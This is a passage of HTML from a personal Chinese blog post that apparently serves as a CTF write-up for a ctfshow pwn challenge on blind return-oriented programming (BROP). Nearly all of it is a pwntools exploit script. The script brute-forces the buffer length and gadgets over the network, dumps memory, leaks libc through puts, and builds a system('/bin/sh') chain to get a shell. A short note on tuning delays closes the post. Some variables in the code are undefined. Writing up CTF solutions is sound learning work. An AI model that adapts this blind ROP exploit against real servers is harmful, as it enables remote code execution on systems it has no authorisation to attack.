class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;,&quot;28258&quot;)</span><br><span class="line">context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def getBufferLength():</span><br><span class="line">	i = 1</span><br><span class="line">	while True:</span><br><span class="line">		try:</span><br><span class="line">		    p = remote(&quot;pwn.challenge.ctf.show&quot;,&quot;28258&quot;)</span><br><span class="line">		    p.recvuntil(&quot;Welcome to CTFshow-PWN ! Do you know who is daniu?\n&quot;)</span><br><span class="line">		    # 这里注意不要用sendline，sendline会多一个回车</span><br><span class="line">		    p.send(i*b&#x27;a&#x27;)</span><br><span class="line">		    data = p.recv()</span><br><span class="line">		    p.close()</span><br><span class="line">		    if b&quot;No passwd&quot; in data:</span><br><span class="line">		        i += 1</span><br><span class="line">		    else: </span><br><span class="line">		    	return i-1</span><br><span class="line">		except EOFError:</span><br><span class="line">		    p.close()</span><br><span class="line">		    return i-1</span><br><span class="line"> </span><br><span class="line">def getStopGadget(buf_length):</span><br><span class="line">	# 没有任何意义的initial_address，单纯是感觉写address比较膈应</span><br><span class="line">	initial_address = 0x400000</span><br><span class="line">	address = initial_address</span><br><span class="line">	while True:</span><br><span class="line">		print(hex(address))</span><br><span class="line">		try: </span><br><span class="line">			p = remote(&quot;pwn.challenge.ctf.show&quot;,&quot;28258&quot;)            </span><br><span class="line">			p.recvuntil(&quot;Welcome to CTFshow-PWN ! Do you know who is daniu?\n&quot;)</span><br><span class="line">			p.send(cyclic(buf_length) + p64(address))</span><br><span class="line">			data = p.recv()</span><br><span class="line">			p.close()</span><br><span class="line">			if b&quot;Welcome to CTFshow-PWN ! Do you know who is daniu?&quot; in data:</span><br><span class="line">				return address</span><br><span class="line">			else:</span><br><span class="line">				p.close()</span><br><span class="line">				address += 1</span><br><span class="line">		except EOFError:</span><br><span class="line">			address += 1</span><br><span class="line">			p.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def getBropGadget(buf_length,stop_gadget):</span><br><span class="line">	brop_gadget = stop_gadget</span><br><span class="line">	while True:</span><br><span class="line">		sleep(1)</span><br><span class="line">		brop_gadget += 1</span><br><span class="line">		payload = b&#x27;a&#x27; * buf_length</span><br><span class="line">		payload += p64(brop_gadget)</span><br><span class="line">		payload += p64(1) + p64(2) + p64(3) + p64(4) + p64(5) + p64(6)</span><br><span class="line">		payload += p64(stop_gadget)</span><br><span class="line">		try:</span><br><span class="line">			p = remote(&quot;pwn.challenge.ctf.show&quot;,&quot;28258&quot;)</span><br><span class="line">			p.recvline()</span><br><span class="line">			p.sendline(payload)</span><br><span class="line">			p.recvline()</span><br><span class="line">			p.close()</span><br><span class="line">			log.info(&quot;find address: 0x%x&quot; % brop_gadget)</span><br><span class="line">			try: # check</span><br><span class="line">				payload = b&#x27;a&#x27; * buf_length</span><br><span class="line">				payload += p64(brop_gadget)</span><br><span class="line">				payload += p64(1) + p64(2) + p64(3) + p64(4) + p64(5) + p64(6)</span><br><span class="line">				p = remote(&quot;pwn.challenge.ctf.show&quot;,&quot;28258&quot;)</span><br><span class="line">				p.recvline()</span><br><span class="line">				p.sendline(payload)</span><br><span class="line">				p.recvline()</span><br><span class="line">				p.close()</span><br><span class="line">				log.info(&quot;bad address: 0x%x&quot; % brop_gadget)</span><br><span class="line">			except:</span><br><span class="line">				p.close()</span><br><span class="line">				log.info(&quot;gadget address: 0x%x&quot; % brop_gadget)</span><br><span class="line">				return brop_address</span><br><span class="line">		except EOFError as e:</span><br><span class="line">			p.close()</span><br><span class="line">			log.info(&quot;bad: 0x%x&quot; % brop_gadget)</span><br><span class="line">		except:</span><br><span class="line">			log.info(&quot;Can&#x27;t connect&quot;)</span><br><span class="line">			brop_gadget -= 1</span><br><span class="line">             </span><br><span class="line">def getPutsAddr(buf_length,stop_gadget,brop_gadget):</span><br><span class="line">	pop_rdi_ret = brop_gadget + 9</span><br><span class="line">	puts_addr = stop_gadget</span><br><span class="line">	while True:</span><br><span class="line">		sleep(1)</span><br><span class="line">		puts_addr += 1</span><br><span class="line">		payload = b&#x27;a&#x27; * buf_length</span><br><span class="line">		payload += p64(pop_rdi_ret)</span><br><span class="line">		payload += p64(0x400000)</span><br><span class="line">		payload += p64(stop_gadget)</span><br><span class="line">		try:</span><br><span class="line">			p = remote(&quot;pwn.challenge.ctf.show&quot;,&quot;28258&quot;)</span><br><span class="line">			p.recvline()</span><br><span class="line">			p.sendline(payload)</span><br><span class="line">			if p.recv().startswith(&quot;\x7fELF&quot;):</span><br><span class="line">				log.info(&quot;puts_addr: 0x%x&quot; % puts_addr)</span><br><span class="line">				p.close()</span><br><span class="line">				return puts_addr</span><br><span class="line">			log.info(&quot;bad: 0x%x&quot; % puts_addr)</span><br><span class="line">			p.close()</span><br><span class="line">		except EOFError as e:</span><br><span class="line">			p.close()</span><br><span class="line">			log.info(&quot;bad: 0x%x&quot; % puts_addr)</span><br><span class="line">		except:</span><br><span class="line">			log.info(&quot;Can&#x27;t connect&quot;)</span><br><span class="line">			puts_addr -= 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">			</span><br><span class="line">def DumpMemory(buf_length,stop_gadget,brop_gadget,puts_addr,start_addr,end_addr):</span><br><span class="line">	pop_rdi_addr = brop_gadget + 9</span><br><span class="line">	res = &quot;&quot;</span><br><span class="line">	while start_addr &lt; end_addr:</span><br><span class="line">		sleep(1)</span><br><span class="line">		payload = b&#x27;a&#x27; * buf_length</span><br><span class="line">		payload += p64(pop_rdi_addr)</span><br><span class="line">		payload += p64(start_addr)</span><br><span class="line">		payload += p64(puts_plt)</span><br><span class="line">		payload += p64(stop_gadget)</span><br><span class="line">		try:</span><br><span class="line">			p = remote(&quot;pwn.challenge.ctf.show&quot;,&quot;28258&quot;)</span><br><span class="line">			p.recvline()</span><br><span class="line">			p.sendline(payload)</span><br><span class="line">			data = p.recv(timeout=0.1)</span><br><span class="line">			if data == &#x27;\n&#x27;:</span><br><span class="line">				data = b&#x27;\x00&#x27;</span><br><span class="line">			elif data[-1] == &#x27;\n&#x27;:</span><br><span class="line">				data = data[:-1]</span><br><span class="line">			log.info(&quot;leaking: 0x%x --&gt; %s&quot; % (start_addr,(data or &#x27;&#x27;).encode(&#x27;hex&#x27;)))</span><br><span class="line">			result += data</span><br><span class="line">			start_addr += len(data)</span><br><span class="line">			p.close()</span><br><span class="line">		except:</span><br><span class="line">			log.info(&quot;Can&#x27;t connect&quot;)</span><br><span class="line">	return result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">	buf_length = 72</span><br><span class="line">	stop_gadgets = 0x400728</span><br><span class="line">	brop_gadgets = 0x4007ba</span><br><span class="line">	pop_rdi_ret = 0x400843</span><br><span class="line">	puts_plt = 0x400550</span><br><span class="line">	puts_got = 0x602018</span><br><span class="line">	p.recvuntil(&#x27;Do you know who is daniu?\n&#x27;)</span><br><span class="line">	payload = b&#x27;a&#x27; * buf_length</span><br><span class="line">	payload += p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt)</span><br><span class="line">	payload += p64(stop_gadgets)</span><br><span class="line">	p.sendline(payload)</span><br><span class="line">	puts = u64(p.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">	libc = LibcSearcher(&#x27;puts&#x27;,puts)</span><br><span class="line">	libc_base = puts - libc.dump(&#x27;puts&#x27;)</span><br><span class="line">	system = libc_base + libc.dump(&#x27;system&#x27;)</span><br><span class="line">	bin_sh = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class="line">	payload = b&#x27;a&#x27; * buf_length + p64(pop_rdi_ret) + p64(bin_sh) + p64(system)</span><br><span class="line">	p.sendline(payload)</span><br><span class="line">	p.interactive()</span><br></pre></td></tr></table></figure>

<p>那个sleep的时间可能要调长一点，虚拟机的配置不是很高，网速延迟也有点高的话可能收不到那个返回值，就很容易错过正确的gadget（所以最后我还是用了官方wp给的数据，跑起来有点太耗时了，还得经常给容器延时，麻烦呀）</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://zx2023qj.github.io">zx</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://zx2023qj.github.io/2024/09/03/brop/">https://zx2023qj.github.io/2024/09/03/brop/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://zx2023qj.github.io" target="_blank">zx's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/pwn/">pwn</a><a class="post-meta__tags" href="/tags/ctfshow/">ctfshow</a><a class="post-meta__tags" href="/tags/brop/">brop</a></div><div class="post_share"><div class="social-share" data-image="/img/3.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/" title="pwn35-90栈溢出"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">pwn35-90栈溢出</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2024/06/28/pwn0-34/" title="pwn0-34"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-06-28</div><div class="title">pwn0-34</div></div></a></div><div><a href="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/" title="pwn35-90栈溢出"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-03</div><div class="title">pwn35-90栈溢出</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/3.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">zx</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">13</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">15</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/zx2023qj"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#brop"><span class="toc-number">1.</span> <span class="toc-text">brop</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0%EF%BC%9A"><span class="toc-number">1.0.1.</span> <span class="toc-text">概述：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%89%8D%E6%8F%90%E6%9D%A1%E4%BB%B6%EF%BC%9A"><span class="toc-number">1.0.2.</span> <span class="toc-text">前提条件：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E9%93%BE%E6%9D%A1-attack-chain"><span class="toc-number">1.0.3.</span> <span class="toc-text">攻击链条(attack chain)</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/09/03/brop/" title="brop">brop</a><time datetime="2024-09-03T10:49:10.000Z" title="发表于 2024-09-03 18:49:10">2024-09-03</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/" title="pwn35-90栈溢出">pwn35-90栈溢出</a><time datetime="2024-09-03T10:11:43.000Z" title="发表于 2024-09-03 18:11:43">2024-09-03</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/09/02/%E5%BF%83%E6%83%85%E4%B8%8D%E5%A5%BD%E5%86%99%E7%82%B9/" title="心情不好写点 &amp; 2024年8月总结">心情不好写点 &amp; 2024年8月总结</a><time datetime="2024-09-02T00:34:26.000Z" title="发表于 2024-09-02 08:34:26">2024-09-02</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/06/28/pwn0-34/" title="pwn0-34">pwn0-34</a><time datetime="2024-06-28T13:32:57.000Z" title="发表于 2024-06-28 21:32:57">2024-06-28</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/05/08/sm3%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/" title="sm3长度拓展攻击">sm3长度拓展攻击</a><time datetime="2024-05-08T02:50:45.000Z" title="发表于 2024-05-08 10:50:45">2024-05-08</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By zx</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>